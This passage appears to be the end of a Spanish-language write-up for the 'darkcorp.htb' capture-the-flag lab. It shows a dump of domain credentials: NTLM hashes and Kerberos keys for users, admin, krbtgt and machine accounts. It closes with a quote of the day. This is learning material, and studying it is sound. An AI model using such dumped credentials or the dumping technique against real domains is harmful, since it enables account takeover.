Administrator:500:aad3b435b51404eeaad3b435b51404ee:fcb3ca5a19a1ccf2d14c13e8b64cde0f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c032c3e2657f4554bc7af108bd5ef17:::
victor.r:1103:aad3b435b51404eeaad3b435b51404ee:06207752633f7509f8e2e0d82e838699:::
svc_acc:1104:aad3b435b51404eeaad3b435b51404ee:01f55ea10774cce781a1b172478fcd25:::
john.w:1105:aad3b435b51404eeaad3b435b51404ee:b31090fdd33a4044cd815558c4d05b04:::
angela.w:1106:aad3b435b51404eeaad3b435b51404ee:957246c8137069bca672dc6aa0af7c7a:::
angela.w.adm:1107:aad3b435b51404eeaad3b435b51404ee:cf8b05d0462fc44eb783e3f423e2a138:::
taylor.b:1108:aad3b435b51404eeaad3b435b51404ee:ab32e2ad1f05dab03ee4b4d61fcb84ab:::
taylor.b.adm:14101:aad3b435b51404eeaad3b435b51404ee:0577b4b3fb172659dbac0be4554610f8:::
darkcorp.htb\eugene.b:25601:aad3b435b51404eeaad3b435b51404ee:84d9acc39d242f951f136a433328cf83:::
darkcorp.htb\bryce.c:25603:aad3b435b51404eeaad3b435b51404ee:5aa8484c54101e32418a533ad956ca60:::
DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:45d397447e9d8a8c181655c27ef31d28:::
DRIP$:1601:aad3b435b51404eeaad3b435b51404ee:3cb25e56c360e6dea7d7ef316d931bf6:::
WEB-01$:20601:aad3b435b51404eeaad3b435b51404ee:8f33c7fc7ff515c1f358e488fbb8b675:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:97064b5e2ed9569a7a61cb6e71fd624e20de8464fc6d3f7f9c9ccd5ec865cd05
Administrator:aes128-cts-hmac-sha1-96:0424167c3041ed3b8df4ab1c996690c1
Administrator:des-cbc-md5:a1b004ad46dc19d9
krbtgt:aes256-cts-hmac-sha1-96:2795479225a152c8958119e8549079f2a59e101d84a3e464603a9cced55580d6
krbtgt:aes128-cts-hmac-sha1-96:183ebcd77ae33f476eb13c3f4404b98d
krbtgt:des-cbc-md5:7fe9e5ad67524001
victor.r:aes256-cts-hmac-sha1-96:84e79cb6b8959ebdda0dc73d2c6728bb9664d0d75c2aef702b0ea0a4126570bb
victor.r:aes128-cts-hmac-sha1-96:bc1fa04172b62be4428af05dcd4941af
victor.r:des-cbc-md5:62491fa740918316
svc_acc:aes256-cts-hmac-sha1-96:21ebfe2a41e5d614795ef004a06135748d5af03d0f2ca7fd6f6d804ac00f759a
svc_acc:aes128-cts-hmac-sha1-96:aebdba02d03943f17f553495f5f5e1d1
svc_acc:des-cbc-md5:5bec0bb54a405ed9
john.w:aes256-cts-hmac-sha1-96:6c0d89a7461f21150bbab0e4c9dea04ca4feb27a4f432c95030dbfa17f4f7de5
john.w:aes128-cts-hmac-sha1-96:16da7304c10a476b10a0ad301f858826
john.w:des-cbc-md5:e90b041f52b30875
angela.w:aes256-cts-hmac-sha1-96:25f7053fcfb74cf4f02dab4b2c7cb1ae506f3c3c09e4a5b7229b9f21a761830a
angela.w:aes128-cts-hmac-sha1-96:15f1467015c7cdd49ef74fd2fe549cf3
angela.w:des-cbc-md5:5b0168dacbc22a5e
angela.w.adm:aes256-cts-hmac-sha1-96:bec3236552b087f396597c10431e9a604be4b22703d37ae45cde6cd99873c693
angela.w.adm:aes128-cts-hmac-sha1-96:994dccb881c6a80c293cac8730fd18a2
angela.w.adm:des-cbc-md5:cb0268169289bfd9
taylor.b:aes256-cts-hmac-sha1-96:b269239174e6de5c93329130e77143d7a560f26938c06dae8b82cae17afb809c
taylor.b:aes128-cts-hmac-sha1-96:a3f7e9307519e6d3cc8e4fba83df0fef
taylor.b:des-cbc-md5:9b8010a21f1c7a3d
taylor.b.adm:aes256-cts-hmac-sha1-96:4c1e6783666861aac09374bee2bc48ba5ad331f3ac87e067c4a330c6a31dd71a
taylor.b.adm:aes128-cts-hmac-sha1-96:85712fd85df4669be88350520651cfe2
taylor.b.adm:des-cbc-md5:ce6176f4f4e5cd9e
darkcorp.htb\eugene.b:aes256-cts-hmac-sha1-96:33e0cf90ad3c5d0cd264207421c506b56b8ca9703b5be8c58a97169851067fd1
darkcorp.htb\eugene.b:aes128-cts-hmac-sha1-96:adf8b2743349be9684f8ec27df53fa92
darkcorp.htb\eugene.b:des-cbc-md5:2f5ef4b06b231afd
darkcorp.htb\bryce.c:aes256-cts-hmac-sha1-96:e835ec6b7d680472bdf65ac11ec17395930b5d778ba08481ef7290616b1fa7a8
darkcorp.htb\bryce.c:aes128-cts-hmac-sha1-96:09b1a46858723452ce11da2335b602b0
darkcorp.htb\bryce.c:des-cbc-md5:26d55b5849b6e623
DC-01$:aes256-cts-hmac-sha1-96:23f8c53f91fd2035d0dc5163341bd883cc051c1ba998f5aed318cd0d820fa1b2
DC-01$:aes128-cts-hmac-sha1-96:2715a4681263d6f9daf03b7dd7065a23
DC-01$:des-cbc-md5:8038f74f7c0da1b5
DRIP$:aes256-cts-hmac-sha1-96:165ab6702fbc793dc3f69246511efc20748112b4fd5c1b8f179c4664b5ec5c72
DRIP$:aes128-cts-hmac-sha1-96:1dffa2c5ae76cd2473f76fc0940985a8
DRIP$:des-cbc-md5:0b460b98dfa2e625
WEB-01$:aes256-cts-hmac-sha1-96:f16448747d7df00ead462e40b26561ba01be87d83068ef0ed766ec8e7dd2a12e
WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
WEB-01$:des-cbc-md5:38e00bb3d901eaef
[*] Cleaning up... 
```

Gracias por leer, a continuación te dejo la cita del día.

> I think and that is all that I am.
> — Wayne Dyer
{: .notice--info}
